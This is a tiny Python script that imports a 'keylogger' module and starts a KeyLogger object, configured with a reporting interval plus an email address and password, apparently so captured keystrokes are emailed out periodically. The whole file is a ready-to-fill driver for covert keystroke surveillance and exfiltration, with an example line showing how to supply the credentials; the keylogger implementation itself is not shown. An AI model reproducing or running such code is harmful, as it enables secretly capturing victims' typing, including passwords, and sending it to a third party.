#import keylogger.py script

import keylogger

#eg:(10," xyz@gmail.com","123xyz",)
keylogger_obj = keylogger.KeyLogger([time_interval_for_getting_email],[your_email_address],[password_of_email])
keylogger_obj.start()
